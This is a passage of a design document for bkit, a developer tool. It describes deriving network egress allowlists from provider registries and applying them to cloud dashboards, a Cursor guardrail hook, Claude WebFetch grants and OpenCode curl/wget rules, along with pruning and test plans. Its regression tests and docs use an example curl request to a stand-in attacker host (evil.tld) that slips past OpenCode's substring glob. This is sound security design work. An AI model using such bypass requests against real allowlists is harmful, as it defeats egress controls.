**Its `declared.length === 0` branch retires too, for the same reason the Claude one does.** The v1 draft named the Claude retirement as a decision row but left the Cursor twin unstated; round-1 review caught the asymmetry. The current zero-declared prose says "no `allowed-domains` block is declared … so **nothing extra is required here**" (`bkit-cloud-env.ts:648-656`), which becomes flatly false once shipped hosts always union in: a consumer with zero declarations running Cloud Agents in **Allowlist only** mode still needs `api.z.ai`, `api.groq.com` and the rest, and Cursor's Trusted-equivalent ("Default + allowlist") is not documented to cover provider API hosts. Both renderers therefore end up single-branch: always emit a paste block, and keep the existing pointer prose inviting the consumer to add their own stack domains. Retiring both branches together also removes the "why does Claude list hosts when Cursor says nothing is needed?" support question before it can be asked.

**Fingerprint — rendered as prose OUTSIDE the fence, never inside it.** Both renderers put the domain list inside a ` ```text ` fence, and the doc instructs the consumer to paste that fence's content verbatim into the vendor "Allowed domains" field, one per line (`bkit-cloud-env.ts:563-570`, `:658-666`). A `# bkit-allowlist <hex>` line placed "into the paste block", as the v1 draft worded it, would be submitted to the dashboard as if it were a domain — at best rejected by field validation, at worst silently accepted as a junk entry. The fingerprint is therefore appended to the **italic prose line that already follows the closing fence** in both renderers, e.g.:

```
_38 entries — 19 domain(s), each as apex + `*.` wildcard. Allowlist fingerprint: `a1b2c3d4`._
```

Nothing inside the fence changes. The plan must carry this as an explicit assertion, not a builder's judgement call: a test asserts the fingerprint token appears **after** the closing fence in both `.claude/cloud.md` and `.cursor/cloud.md`, so a later refactor cannot slide it back in.

**Fingerprint input = the derived set only, not the consumer union.** Hashing the union would change the fingerprint on every `allowed-domains` edit, re-firing the "your paste is stale" signal for a change the consumer just made deliberately and already knows about — training them to ignore it. Hashing the derived set alone means it changes only at bkit-release cadence, which is exactly the event a re-paste is needed for. Computed with the `sha256` already exported from `bkit-version.ts:190` (cycle-free from `bkit-cloud-env.ts`; no second hasher, no new import of `node:crypto`), truncated to 8 hex.

### 2. Cursor hook — delete the duplicate rather than automate it

`SHIPPED_NETWORK_BASES` is removed from `.cursor/hooks/guardrails.cjs` and its template twin. `loadNetworkAllowlistBases()` starts from an empty `Set` and reads `.cursor/allowlist.json` alone. Empty set -> `curlWgetHostAllowed` returns false for any parseable URL -> **ask**, the direction #394's resolution established as safe ("guessing here converts an ask into an allow"). The hook file shrinks; the `keep in sync with …` comment goes with it. The ask message names `.cursor/allowlist.json` and `bkit install` so the degraded state is self-diagnosing.

Same-pass guarantee (verified): `runCursorModule` writes the hook at `bkit-modules.ts:1272-1281` and the artifact at `:1332-1341`; upgrade writes the artifact under the same `renderModules.has("cursor")` gate at `bkit-install.ts:2595-2604`. The artifact exists whenever the hook does.

The slop-scan `_reason` at `slop-scan.config.json:175` becomes factually wrong in this change — it currently justifies the empty catch as "fail-OPEN … the shipped fallback is correct behaviour". After this the contract is "must not crash the session; a corrupt artifact degrades to ask". The exemption stays; its prose must be rewritten in the same commit.

### 3. Claude `WebFetch` — enrich becomes the sole writer, and it prunes

The `WebFetch(domain:…)` seed block is removed from `.bkit/templates/.claude/settings.json`. It is a partial copy today (7 of 13 bases carry only the `*.` form) that `enrichClaudeSettingsWebFetch` silently tops up, so it is a stale subset nobody notices — the same hand-sync failure as the hook. Enrich runs in the same `runClaudeModule` pass that writes `settings.json` (`bkit-modules.ts:1033`) and again on upgrade (`bkit-install.ts:2605-2616`), so the grants land whenever the file does. Deep-containment (`format: "json"`) only gets easier when the template's array shrinks.

Prune pass, in the same function:

```
previous = .bkit/version webFetchDerived  (absent -> [])
current  = resolveNetworkAllowlist(cwd) mapped to WebFetch(domain:…)
add      = current \ allow
remove   = (previous \ current) ∩ allow
write    = allow - remove + add            # only when add or remove is non-empty
record   = current                          # RETURNED to the caller; never written here
```

First run after upgrade has no record and therefore prunes nothing — the honest behaviour, and the same "additive-only until we know what we wrote" doctrine already stated in the code.

**The honest guarantee.** The v1 draft claimed `previous \ current` "provably cannot delete a consumer's hand-added grant". That is false, and the draft contradicted itself two sections later in Trade-offs. The true statement, which is what the plan and the code comment must say:

> The prune can only remove a grant that bkit **recorded writing** on a previous run. It cannot remove a grant bkit never recorded. It **can** remove a grant the consumer added by hand if that exact string was also in bkit's derived set at the moment of a previous recording run — bkit cannot distinguish the two, because `permissions.allow` carries no provenance.

That residual case is narrow and disclosed: it requires the consumer to hand-add a domain that bkit later derives independently, _and_ for that domain to subsequently leave the derived set. The failure mode is a re-declarable grant, not data loss, and `.claude/settings.json` is git-tracked so the removal is a line in `git diff`. The alternative — never record, never prune — is the status quo Success Criterion 4 exists to fix. What is **not** accepted is silence: see the removal-record contract below.

**Recording contract — the record follows the write, never the intent.** `enrichClaudeSettingsWebFetch` has four returns that reach no write (`bkit-modules.ts:1737-1758`): the settings file is absent; `JSON.parse` throws; `permissions.allow` is not an array; and `missing.length === 0`. Under `dryRun` it also skips the write while still pushing to `ws.writes`. If `webFetchDerived := current` were recorded on any of those paths, bkit would claim grants it never wrote — and the _next_ run's `previous \ current` would then be free to delete consumer entries that bkit had never authored. That is a strictly worse failure than the additive-only status quo. Rules, all mechanical:

<!-- prettier-ignore -->
| Path | Writes settings.json? | Returns a record? | Why |
| --- | --- | --- | --- |
| file absent | no | **null** | nothing to make a claim about |
| `JSON.parse` throws | no | **null** | contents unknown; a claim would be a guess |
| `permissions.allow` not an array | no | **null** | same |
| `dryRun` | no | **null** | `bkit check` must never mutate provenance; also what keeps Success Criterion 3 true |
| `add` and `remove` both empty | no (no-op) | **`current`** | the file already equals what bkit would write — the claim is true, and recording it is what lets a _later_ shrink prune |
| `add` or `remove` non-empty | yes | **`current`** | the claim matches the bytes just written |

Note the fifth row is why the existing `if (missing.length === 0) return;` early return must be **restructured, not extended**: today it is the no-op fast path; with a prune it must fall through to the removal computation, and the combined `add.length === 0 && remove.length === 0` case must still return `current` rather than null. Getting this backwards makes a steady-state install never record, and the prune never fires.

**Where a removal is recorded (the v1 draft said "log every removed entry" and named no destination).** Three real, already-existing destinations, in ascending durability:

1. **Console, both paths.** One line per removed grant behind `LOG_PREFIX`, matching the existing per-write upgrade logging at `bkit-install.ts:2612-2616`. Immediate, transient.
2. **`.bkit/advisories.md`** — the codebase's existing durable consumer-facing notice artifact (`writeAdvisoriesArtifact`, `bkit-postinstall.ts:2215-2243`). Enrich takes an `advisories: PreflightFinding[]` parameter and pushes one finding when `remove` is non-empty: `{ id: "webfetch-grants-pruned", severity: "advisory", detect: "<N> WebFetch grant(s) bkit previously wrote were removed because their host left the derived set or your allowed-domains: <exact strings>", action: "If you still need one, declare its apex in .agents/config.md allowed-domains and re-run bkit install; the removal is also visible in git diff .claude/settings.json." }`. On install/check this is `ctx.advisories`, the same shared array every other module uses, and it flows through `runPostInstallCheck` -> `formatChecklist` banner **and** the artifact write at `bkit-install.ts:2990`. It survives the terminal scrolling.
3. **`git diff .claude/settings.json`** — the after-the-fact audit path. `.claude/settings.json` is git-tracked (`git ls-files` confirms; no `.gitignore` rule covers it), so every removal is a reviewable deleted line with full history. The advisory's `action` text names this explicitly so a consumer who finds the advisory days later knows where to look.

**Stated limitation, not papered over:** `bkit upgrade` does **not** write `.bkit/advisories.md` today — `writeAdvisoriesArtifact` is called only from the doctor branch (`bkit-install.ts:2124`) and the install/check path (`:2990`), and the upgrade branch returns at `:2669` without it. On upgrade, destinations (1) and (3) apply and (2) does not. Wiring upgrade into the advisories artifact is a general install/upgrade-parity gap that pre-dates this issue and is recorded as a deferral rather than solved here; the prune does not depend on it, because (3) is durable and version-controlled.

### 4. OpenCode `curl`/`wget` allows and `.cursor/allowlist.json`

Unchanged code paths — both already call `resolveNetworkAllowlist` and pick up the widened set for free. One doc consequence: `curl *{base}*` is a **command substring** glob, so `curl https://evil.tld/?x=z.ai` is allowed on OpenCode even though the Cursor hook (host-parsed since #394) rejects it. Widening the base list widens that asymmetry; it is inherent to OpenCode's permission schema and must be **stated** in the docs, not implied.

### 5. Docs changed in the same commit

<!-- prettier-ignore -->
| File | Change |
| --- | --- |
| `.agents/config.md:111-118` § Cloud allowed domains | State that provider/tooling hosts are derived from bkit's registries and must **not** be re-declared here; `allowed-domains` is consumer stack domains only. |
| `.bkit/templates/.agents/config.md:113-118` | Same edit — the template twin is what ships into consumers. |
| `.bkit/providers.md:260-275` § Network allowlist | Line 273 ("Missing file ⇒ guardrails falls back to tooling defaults embedded in the hook") becomes false — rewrite to "missing file ⇒ ask on every `curl`/`wget`; re-run `bkit install`". Add the OpenCode substring-glob weakness note. Add the support-facing note that the cloud paste blocks now carry an allowlist fingerprint and that triage should ask a "cloud agent can't reach host X" reporter for it. |
| `.bkit/cloud.md:109-111` | The "no `allowed-domains` block -> Trusted is enough" guidance is no longer true once provider hosts are in play. |
| **`.bkit/templates/.claude/cloud.md`** § 2 Network access + § 5 Verify | **NEW — closes the fingerprint's missing runbook half.** Add the troubleshooting sentence described below. Verified today: `grep -i "troubleshoot\|timeout"` returns nothing in this file. |
| **`.bkit/templates/.cursor/cloud.md`** § 4 Network access + § 5 Verify | **NEW — same edit, same reason.** Verified today: no troubleshooting or timeout prose exists here either. |
| `.bkit/workflows.md:1124` | Permission-table row for `WebFetch(domain:…)` — confirm it still matches after the template seed is emptied. |
| `.bkit/README.md:345` | Allowlist-encoding pointer — verify wording still holds. |

ASCII operators only in `.bkit/*.md` (`!=`, `>=`, `<=`).

**The cloud.md runbook step (both templates).** Round-1 operability review's central finding was that the fingerprint is a diagnostic _primitive_ with no diagnostic _path_: nothing told an operator to look at it, so it would sit unused until someone already suspected a stale paste — precisely the person who would not need it. Both templates now carry, adjacent to the rendered allowlist block, a sentence that names the **symptom first** (because the symptom is what the operator actually has):

> **If a cloud session's model calls hang or time out with no network error**, the dashboard allowlist is the first thing to check — a stale paste fails as an opaque timeout, not as a connection error. Re-run `bkit install` (or `bkit upgrade`) locally, compare the allowlist fingerprint printed below this block against the one in the copy you pasted into the dashboard, and re-paste the block if they differ.

Three properties this wording is chosen for: it leads with the observable symptom rather than the mechanism; it names the recovery as a single idempotent command plus a paste; and it is written into the two files the operator is _already reading_ when they set the dashboard up, so discovery does not depend on knowing that `.bkit/providers.md` exists. `.bkit/providers.md` carries the same content from the triage side (what to ask a bug reporter for) and cross-links; the two are not duplicates of each other's audience.

Because both `cloud.md` files are gitignored, untracked, and regenerated on every install/upgrade, this text lives in the **templates** and costs nothing in `bkit check`, `canonicalHashes` or any manifest.

### 5b. Tests that must change in the same commit (not new tests — existing ones this change breaks)

<!-- prettier-ignore -->
| Test | Why it breaks |
| --- | --- |
| `.bkit/src/bkit-cloud-env.test.ts:326-330` | Asserts `"Set to **Trusted** (default)"` from `writeClaudeCloudDoc` with nothing declared — the branch is retired. Re-anchor on the always-Custom block carrying shipped hosts. |
| `.bkit/src/bkit-cloud-env.test.ts:399-403` | Same assertion against `renderCloudNetworkAllowlist` directly, plus `"No `allowed-domains` block declared"`. Same re-anchoring; keep the pointer-prose assertion, drop the Trusted one. |
| Cursor zero-declared assertions, if any | The `renderCursorNetworkAllowlist` `declared.length === 0` branch retires alongside the Claude one (§ 1); sweep for assertions on "nothing extra is required here" at plan time. |

The two `BKIT_SHIPPED_NETWORK_DOMAINS` assertions at `:405-408` are **negative** (`not.toContain("vercel.com" / "supabase.com")`) and survive the switch to a computed constant unchanged — they are in fact the right regression guard for it and should stay.

### 6. Tests (none of this is covered today)

1. **Completeness** — for every key of `OPENCODE_PROVIDER_DEFAULTS`, exactly one row with `kind === "opencode-provider" && id === key`; every row has a non-empty `bases` **or** a `reason`; every row with non-empty `bases` has non-empty `hosts` (the invariant that stops the v1 `kimi-docs` Cursor-narrowing shape from recurring); every `id` is unique across the whole table. Table-driven over `Object.keys`, so a new registry entry fails until it declares. `ISSUE_TRACKERS` / `DEP_UPDATERS` are iterated with the literal `"none"` skipped, and the test asserts that `"none"` is the _only_ thing it skipped, so a future member cannot slip through the same hole.
2. **Suffix invariant** — `host === base || host.endsWith("." + base)` and `host === new URL(baseURL).hostname` per derived row. Catches the copy-paste failure (`groq` inheriting `nvidia.com`) that produced the current gaps.
3. **Anti-widening** — no base in `MULTI_TENANT_APEXES` / `MULTI_LABEL_SUFFIXES`; `>= 2` labels; no IP literal; no `localhost`.
4. **Fan-out parity** — one derived union asserted present in **all five** surfaces after a tmp-dir install: cloud paste block, `.cursor/allowlist.json`, `.claude/settings.json` `WebFetch`, `.opencode/opencode.json` `curl`/`wget` globs, and (as an absence assertion) the hook carrying no domain array.
5. **Injected-provider** — add a synthetic entry to a fixture registry, assert every surface changes. This is the test that fails when someone adds a surface without wiring it; no golden snapshot catches that. **How it injects matters and must not be left to the builder:** `BKIT_SHIPPED_NETWORK_DOMAINS` becomes a module-init `const` computed from the registry, so the only way to perturb it is a hoisted `vi.mock("./bkit-registry.js")` — which applies to the _entire test file_, and inside `bkit-modules.integration.test.ts` that would silently perturb every provider-rendering test in the same file. Two acceptable shapes, pick one at plan time: (a) a dedicated test file that mocks nothing else, or (b) — preferred — export the pure `deriveEgressEntries(rows)` from `bkit-cloud-env.ts` and have this test drive it with fixture rows, asserting each surface's _renderer_ against the exported constant rather than against a hardcoded literal. (b) needs no mock at all, keeps the branching inside the coverage-measured file, and is the shape that actually fails when a sixth surface is added without wiring.
6. **Hook byte parity** — `.bkit/templates/.cursor/hooks/guardrails.cjs` byte-equal to `.cursor/hooks/guardrails.cjs` (co-listed in `slop-scan.config.json:174` today, never asserted). The two files are byte-identical right now (`diff` clean), so this lands as a pure regression guard with no repair work attached.
7. **Negative/edge** — `ollama-local` contributes nothing (no `localhost` in any surface); both gateway rows contribute `opencode.ai` + `models.dev` and never `""`; malformed `baseURL` yields no row without throwing; `curl https://evil.tld/?x=z.ai` still asks in the hook (regression guard on the widened list). Plus one case per **rejection channel**, asserting the channel and not merely the outcome: `https://1.2.3.4:8080/v1` and `https://[::1]/v1` are silent proposer rejections (contribute nothing, no throw, no CI failure); `https://api.pages.dev/v1` and `https://x.example.co.uk/v1` are gate rejections (CI red). Conflating these two channels was a v1 defect — the Process Sketch promised silence for IP literals while the gate as written would have failed the build.
8. **Prune round-trip** — record set A, shrink to B, assert `A \ B` grants are gone, a hand-added consumer grant survives, and an absent `webFetchDerived` prunes nothing. Plus the recording contract from § 3, one case per row of that table: absent file, unparseable JSON, non-array `permissions.allow` and `dryRun` each leave the previously-recorded `webFetchDerived` **unchanged** (not cleared, not overwritten); a steady-state no-op run **does** record; and a removal emits the `webfetch-grants-pruned` advisory.
9. **Fingerprint placement** — the fingerprint token appears in both `.claude/cloud.md` and `.cursor/cloud.md` **after** the closing ` ``` ` of the paste fence and never between the fences, so nothing pasteable carries it. Plus stability: editing `allowed-domains` does not change the fingerprint; changing the registry does.
10. **Provenance survives a real install** — seed `.bkit/version`, run the real install in a tmp dir, read the file back, assert `webFetchDerived` is present and correct. This is the test that would have caught the v1 draft's clobbered write path, and it must exist as a test rather than as a one-off plan-time probe, because the clobbering writer (`bkit-modules.ts:924-928`) is a fresh literal that any future field addition can silently re-break.

**Open question 5 is closed, answered NO.** The v1 draft asked whether emptying the `settings.json` template's `WebFetch` array breaks the opencode/claude gate-parity assertion in `bkit-modules.integration.test.ts` and guessed "likely yes". Repo-wide grep for `WebFetch(domain:` across `.bkit/src/*.test.ts` returns **zero hits** — the only occurrences anywhere are `bkit-modules.ts:1717` (JSDoc), `:1748` (the generator) and the template file itself. The gate-parity assertion covers **bash** gates, not WebFetch. Nothing needs re-anchoring on that axis, and no plan-time investigation is warranted. `deepContains`'s subset semantics for arrays (`bkit-tiers.ts:69-71`) independently guarantee that shrinking the template array can only relax containment, so `bkit check` cannot regress from it either.

**Build-lane obligation:** a new `.bkit/src/bkit-registry.ts` produces a new `dist/bkit-registry.js`, which must be built and committed in the same change or `pnpm check:dist` fails the CI lane.

## Decisions

### The three named conflicts

**Conflict 1 — whole-registry (static) vs installed-set (reactive) derivation.**

<!-- prettier-ignore -->
| Decided | Alternatives | Why |
| --- | --- | --- |
| **Derive from every entry of every shipped registry — static, install-state-independent** | Key on `bkit.opencodeProviders` (the issue body's literal text); a two-tier static-floor/reactive-ceiling hybrid | Three reasons, in order of weight. (1) **Hash gating:** `guardrails.cjs` is `byte-equal-text` (`bkit-manifest.ts:267`) — anything install-state-varying in it breaks `bkit check` for every consumer, the same objection that killed #376 alternative 1. (2) **The human-mediated channel argues for static, not against it:** cloud.md is pasted into a vendor dashboard by hand and nothing can detect a stale paste; a static list is pasted once and survives every later provider switch, whereas a reactive list silently goes stale the moment the consumer adds `--opencode=moonshot`. (3) **The security delta is thin:** an egress allowlist gates host reachability, not credentials — carrying `groq.com` on a repo that installed `zai` costs nothing, because no `GROQ_API_KEY` exists to use it. Comment 3 ("ALL providers, not just opencode") also reads more naturally as registry-wide than install-state-wide. |
| The issue's "deterministic + reactive" requirement is met by a stronger property | Implement literal reactivity | The user-visible goal is "installing `--opencode=zai` makes `z.ai` reachable from a cloud session". Static satisfies it **a fortiori** — the host is reachable before the install, not after it — and additionally satisfies "switching provider needs no re-paste", which reactivity does not. Reactivity was the issue body's proposed means, not its end. |
| Rejected the two-tier hybrid even though it is technically available | Static floor in hash-gated surfaces + installed-subset ceiling in `cloud.md` / `allowlist.json` / `settings.json` | Verified that `.claude/cloud.md` is untracked and outside every manifest (`bkit-cloud-env.ts:574-586`), and `.cursor/allowlist.json` is in no manifest — so the hybrid **would** pass `bkit check`. Rejected on shape, not feasibility: it creates a durable asymmetry ("why does the Cursor hook allow `groq.com` when Claude WebFetch does not?") that is easy to forget and hard to explain, and every future "static or reactive for this surface?" question has to be re-litigated per surface. It also reintroduces the re-paste treadmill in point (2) above. |

**Conflict 2 — PSL vs declared `egress` field vs naive base extraction.**

<!-- prettier-ignore -->
| Decided | Alternatives | Why |
| --- | --- | --- |
| **Derive last-two-labels by default; declaration required only where a gate rejects the default** | Declare `egress` on every entry (pure declaration); derive silently with no gate | This is a deliberate merge of the two strongest lenses. Pure declaration is safe but taxes every provider addition with authoring the answer the machine already knows — all 10 current entries pass the default unchanged. Pure derivation has no trip-wire: its failure is silent and in the widening direction. The gate is where the safety lives, not the declaration, so requiring declaration only on gate rejection buys the same guarantee at zero routine cost. |
| **No PSL dependency, no vendored PSL subset** | `psl` / `tldts` runtime dep; hand-copied ICANN table | PSL solves the case that barely occurs in AI-provider hosts (`example.co.uk`) and does **not** solve the case that actually widens egress: `bedrock-runtime.us-east-1.amazonaws.com -> *.amazonaws.com` is every S3 bucket on the internet; `us-central1-aiplatform.googleapis.com -> *.googleapis.com` is Drive, Gmail, GCS and IAM to an agent that may hold an ambient cloud token. Wrong tool for the risk, plus a snapshot dataset needing Renovate bumps. A vendored subset is the same trade minus the bump automation, and embeds an unrecorded ICANN-vs-private-section policy. |
| **Two denylists as gates, never rewriters** | Silently narrow to the raw host on a hit; no check at all | A gate fails loud at authoring time inside the bkit repo. A silent rewrite ships a surprise to every consumer and is invisible in review. |
| **`URL.canParse` before `new URL`, never `try`/`catch`** | `try { new URL(x) } catch { return … }` | Node engine is `>=20` (`package.json:28-30`), so `canParse` is available. A new catch-with-default-return trips `defensive.error-obscuring` and fails `slop:delta` on net score even at net-zero finding count. |
| **Emit `{hosts, bases}` per row, not `base` alone** | `base` only, as the issue body proposes | `renderCursorNetworkAllowlist` (`bkit-cloud-env.ts:646-669`) deliberately refuses `*.` expansion on Cursor's own broad-wildcard warning. A base-only record has nothing correct to give that surface. |
| **`bases` is a LIST and every `id` is atomic** (one row per registry key / source) | `base: string` with composite ids, as v1 drafted it | The v1 type could not express its own populated set: three rows carried multiple bases in one cell and three carried composite ids (`claude / cursor / opencode`). A composite id also makes the completeness test unsatisfiable — it keys on `id === key` over `Object.keys(OPENCODE_PROVIDER_DEFAULTS)`, which `"a / b / c"` can never match. Splitting rows costs four table lines and buys a mechanically checkable invariant; duplicate values across split rows are free, since the derived exports are flatten-sort-unique. |
| **Proposer rejections are silent; gate rejections are CI-red — IP literals are proposer rejections** | One combined check; let the `>= 2 labels` gate catch IP literals | The v1 draft enumerated IP literals as a failure case but specified no detector, and its two mechanisms disagreed on the outcome: `1.2.3.4` passes a label count and collapses to the garbage base `3.4`, while `[::1]` fails it as CI red even though the Process Sketch promises silent omission. `URL.hostname` normalises both families into two recognisable shapes (bracketed for IPv6, dotted quad for IPv4), so the detector is two lines and needs no library. Silent is right because a loopback/IP `baseURL` is a legitimate registry entry — `ollama-local` is one today. |

**Conflict 3 — Cursor hook fallback: generated or deleted.**

<!-- prettier-ignore -->
| Decided | Alternatives | Why |
| --- | --- | --- |
| **Delete `SHIPPED_NETWORK_BASES` outright; `.cursor/allowlist.json` becomes the sole source** | Codegen the array into the hook at `pnpm build`; keep it hand-synced with a parity test | Codegen recreates the exact failure the issue exists to remove — a build step that can silently not run, leaving two copies drifting again — and couples a hash-gated shipped artifact to a build ordering. Deletion is the literal elimination comment 2 asks for. Verified safe: the hook and the artifact are written in the same `runCursorModule` pass and under the same upgrade gate, so the artifact exists whenever the hook does, and an empty set degrades to **ask**, the direction #394 established as correct. |
| **No two-entry safety floor (`github.com` + `npmjs.com`) in the hook** | Keep a minimal hardcoded pair so a fresh clone does not ask on everything | Two entries is still a hand-maintained list that can rot, and the case it guards cannot occur: the hook only exists because `bkit install` put it there, and that same pass wrote the artifact. The residual case is a consumer who deletes or gitignores `.cursor/allowlist.json` — solved by naming the file and `bkit install` in the ask message, which costs no list. |
| **Empty the `WebFetch(domain:…)` seed from the shipped `settings.json` template too** | Keep a complete template guarded by a parity test | Same doctrine, applied to the fourth copy the brainstorms surfaced: the template block is already a stale partial subset (7 of 13 bases carry only the `*.` form) that enrich tops up invisibly. A parity test would automate the sync; emptying eliminates it. Enrich runs in the same pass that writes the file (`bkit-modules.ts:1033`), deep-containment only gets easier when the template array shrinks, and `.bkit/workflows.md:1124` already documents the row generically rather than by enumeration. |

### Remaining decisions

<!-- prettier-ignore -->
| Decided | Alternatives | Why |
| --- | --- | --- |
| **`renderCloudNetworkAllowlist` switches to `resolveNetworkAllowlist`; the "Trusted default" branch is retired** | Leave it consumer-only; keep Trusted when nothing is declared | This is the literal #381 bug (`bkit-cloud-env.ts:546-557` renders consumer-only), so `--opencode=zai` is already broken in Claude-web even though `z.ai` is in the shipped constant. Trusted covers package registries and GitHub, not provider API hosts, so a zero-declaration consumer still needs Custom. |
| **`renderCursorNetworkAllowlist`'s zero-declared branch retires in the same change** | Retire only the Claude branch (v1's implicit position); leave the Cursor prose alone | v1 stated the Claude retirement as a decision and left the Cursor twin unmentioned, which would have shipped the contradiction: Cursor's branch says "nothing extra is required here" (`bkit-cloud-env.ts:648-656`) while shipped provider hosts now always union in, and a zero-declaration consumer in **Allowlist only** mode still cannot reach `api.z.ai`. Retiring both together also pre-empts the "why does Claude list hosts when Cursor says none are needed?" support question. |
| **New leaf `.bkit/src/bkit-registry.ts` holds data only; derivation stays in `bkit-cloud-env.ts`** | Derive inside `bkit-modules.ts`; lazy import to tolerate a cycle; put derivation in the leaf too | `bkit-modules.ts:59-65` already imports from `bkit-cloud-env.ts` and both symbols are module-init consts, so the cycle is not survivable. Keeping the leaf branch-free avoids adding a file to the `package.json:47` unit-coverage brace list under a `branches=70` threshold. |
| **Prune via a `webFetchDerived` provenance field in `.bkit/version`, written by the EXISTING per-path version writer** | No prune; prune by shape/guess; a separate sidecar file; let `enrichClaudeSettingsWebFetch` write `.bkit/version` itself (v1's implied path) | `previous \ current` is the narrowest removal set available: it can only remove a grant bkit **recorded writing**, and can never remove one bkit never recorded (the honest guarantee — see § 3; the v1 wording "provably cannot delete a consumer's hand-added grant" was false and self-contradicted). Enrich writing the file itself is not viable: install's `postDispatch` writer builds a **fresh literal** (`bkit-modules.ts:924-928`) that clobbers it, so the record would be permanently `[]` and the prune dead code — or, if enrich pushed `.bkit/version` into `ws.writes`, `bkit check` would be permanently red. Threading through `ctx` into the one existing writer per path keeps `.bkit/version` single-writer and makes the dry-run rule fall out for free. `.bkit/version`'s JSON envelope is an established additive extension point — `canonicalHashes` landed exactly this way with a default-on-absent reader. |
| **Removals are recorded in `.bkit/advisories.md` + `git diff`, not only stdout** | "log every removed entry" with no destination (v1); invent a new audit file | `bkit upgrade` / `bkit install` stdout is transient in CI and agent contexts, so a silent narrowing discovered days later would be unauditable. Both named destinations already exist: `writeAdvisoriesArtifact` (`bkit-postinstall.ts:2215-2243`) is the codebase's established durable notice channel, and `.claude/settings.json` is git-tracked so the removal is a reviewable deleted line. No new mechanism is invented. Limitation stated rather than hidden: the upgrade branch does not write the advisories artifact today, so on upgrade the durable record is `git diff`. |
| **Scope = opencode providers + tracker MCP + agent hosts + package registries + skills registry** | opencode providers only (issue body); include dep-updater/CI hosts | Comment 3 widens to all providers, and four of the six live gaps (`githubcopilot.com`, `models.dev`, `skills.sh`, plus the three registry providers) are outside the opencode registry. Dep-updater hosts stay out: their egress is on GitHub Actions runners, not in an agent session. |
| **`kimi.com` survives as a declared `docs` row, with `hosts: ["kimi.com"]` not `hosts: []`** | Derive everything; drop it; keep v1's `hosts: []` | Kimi's docs host is unreachable from its API `baseURL` (`api.moonshot.ai`). Dropping it silently regresses the #376 WebFetch grant. v1's `hosts: []` would have regressed it on Cursor specifically: `BKIT_SHIPPED_NETWORK_HOSTS` is the exact-host list `renderCursorNetworkAllowlist` unions verbatim, so an empty `hosts` drops `kimi.com` from that one surface while Claude keeps it — an asymmetry nobody would notice until a Cursor consumer filed a #376-shaped bug. The host is knowable, so it is stated, and the completeness test asserts `hosts` non-empty whenever `bases` is. |
| **Emit an allowlist fingerprint as prose AFTER the closing fence, hashed over the derived set only** | No fingerprint; a `# bkit-allowlist <hex>` line inside the paste block (v1); hash the full union | The dashboard paste is the one surface where nothing can compare intended to actual, and a stable 8-hex token is the cheapest thing that makes a stale paste visible in a bug report. Placement is not cosmetic: the ` ```text ` fence is what the doc tells the consumer to paste verbatim into "Allowed domains", so a line inside it is submitted as if it were a domain. Hashing the derived set only keeps the token stable across `allowed-domains` edits, so it changes exactly when a re-paste is actually needed rather than every time the consumer edits their own config. Untracked file, so no hash-gate cost. |
| **Pair the fingerprint with a symptom-first runbook step in both `cloud.md` templates** | Ship the fingerprint alone (v1) | A fingerprint with no instruction to compare it is inert: the only person who would find it is one who already suspects a stale paste, and that person does not need it. Verified that neither template carries any troubleshooting or timeout prose today, so there is no existing sentence to lean on. Leading with the symptom ("model calls hang or time out with no network error") is what makes it reachable from what the operator actually observes — the design's own HIGH risk is precisely that the symptom carries no network signal. |
| **Document the OpenCode substring-glob weakness rather than fix it** | Attempt a stricter OpenCode encoding | `curl *{base}*` is inherent to OpenCode's command-glob permission model; there is no URL-host primitive to switch to. Widening the base list widens the asymmetry with Cursor's host-parsed check, so it must be stated in `.bkit/providers.md`, not implied. Fix tracked as a deferral. |

## Approaches Considered

<!-- prettier-ignore -->
| Approach | Verdict | Why |
| --- | --- | --- |
| **Whole-registry static derivation into a consumer-invariant constant** (brainstorm 1 A, brainstorm 2 A) | **KEPT** | The spine of this design. Satisfies "auto-derive from the registry" and "all providers" while preserving `BKIT_SHIPPED_NETWORK_DOMAINS`'s existing install-state-independence, which is what keeps `guardrails.cjs` byte-equal and `bkit check` clean. |
| **Declared `egress` with a derivation gate** (brainstorm 3 A) | **MERGED** | Its gate, its two denylists, its `{host, base}` record, its `URL.canParse` rule and its PSL rejection are all adopted. Trimmed on one axis: declaration is required only where the gate rejects the derived default, not on every entry, since all 10 current entries pass unchanged. |
| **Delete the hook's fallback list** (brainstorm 1 A, brainstorm 2 A, brainstorm 3 C's hook half) | **KEPT** | Elimination beats automation; verified same-pass write guarantee; empty set fails to `ask`. |
| **Prune via a `.bkit/version` provenance record** (all three brainstorms) | **KEPT** | Unanimous and correct. In scope per the issue comments, not a follow-up. |
| **Installed-set derivation keyed on `bkit.opencodeProviders`** (issue body; brainstorm 1 B, brainstorm 2 B) | **REJECTED** | Cannot feed either hash-gated copy, forces `cwd` threading through ~6 call sites and every test assertion, and makes the human-pasted cloud allowlist go stale on every provider change. Security benefit is marginal — reachability is not a credential. |
| **Two-tier static-floor / reactive-ceiling hybrid** (brainstorm 2 B) | **REJECTED** | Feasible (cloud.md and allowlist.json are both outside every manifest — verified) but creates a permanent per-surface asymmetry, needs a codegen step whose silent non-execution is the exact drift vector being removed, and doubles the documentation burden. |
| **Vendored public-suffix / platform table with no registry field** (brainstorm 3 B) | **REJECTED** | A snapshot with no upstream and no bump automation, consulted for hosts no human reviewed. At scale the probability that one provider sits on an untabled multi-tenant apex approaches certainty, and the failure is silent and widening. |
| **Exact host only, no base collapse** (brainstorm 3 C) | **REJECTED** | Narrows relative to today's shipped constant (`z.ai` -> `api.z.ai`), so `curl https://docs.z.ai/...` starts asking; and a vendor moving streaming to a sibling subdomain kills every cloud run until a bkit release plus a human re-paste. Its hook half is kept; its host-only half is not. |
| **Keep the copies, forbid drift by parity test** (brainstorm 1 C) | **REJECTED** | Does not satisfy the issue ("so the guardrail copy stops being hand-maintained") and leaves a four-file edit per provider forever. Its tests are kept as tests 4 and 6, but as guards over a derived source rather than over hand-typed copies. |
| **Unified runtime artifact read by all three IDE surfaces** (brainstorm 2 C) | **REJECTED** | Blocked by the target tools' own schemas, not by bkit: Claude `permissions.allow` and OpenCode `permission.bash` both require literal per-host strings with no file-reference primitive. Delivers for 1 of 3 surfaces. Recorded as a deferral so it is not re-proposed without re-discovering this. |

## Trade-offs Accepted

**Gained by static whole-registry derivation, sacrificed vs installed-set:** every consumer's allowlist carries roughly 19 bases whether or not they installed the matching provider — a longer dashboard paste block and a marginally wider egress surface for hosts they hold no credentials for. In exchange the list is stable across provider switches (paste once, never again), it is safe to embed in the byte-equal-hash-gated hook, and `enrichClaudeSettingsWebFetch`'s additive-only behaviour stops being a per-consumer drift amplifier — the set now changes only at bkit-release cadence.

